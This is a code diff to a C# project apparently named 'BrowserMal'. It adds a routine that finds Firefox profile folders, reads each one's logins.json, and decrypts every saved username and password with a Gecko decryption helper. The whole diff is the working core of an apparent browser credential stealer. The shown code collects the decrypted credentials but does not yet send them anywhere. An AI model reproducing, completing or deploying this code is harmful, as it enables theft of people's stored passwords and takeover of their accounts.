@@ -1,5 +1,6 @@
 ﻿using BrowserMal.Browser;
 using BrowserMal.Model;
+using Newtonsoft.Json;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -38,7 +39,24 @@ namespace BrowserMal.Manager
         {
             foreach (string profile in profiles)
             {
+                if (File.Exists(Path.Combine(profile, "logins.json")))
+                {
+                    Encryption.GeckoDecryption.Init(profile);
 
+                    GeckoLogin geckoLogin;
+
+                    using (StreamReader sr = new StreamReader(Path.Combine(profile, "logins.json")))
+                    {
+                        string json = sr.ReadToEnd();
+                        geckoLogin = JsonConvert.DeserializeObject<GeckoLogin>(json);
+                    }
+
+                    foreach (GeckoLoginData login in geckoLogin.logins) 
+                    {
+                        string username = Encryption.GeckoDecryption.Decrypt(login.encryptedUsername);
+                        string password = Encryption.GeckoDecryption.Decrypt(login.encryptedPassword);
+                    }
+                }
             }
         }
     }
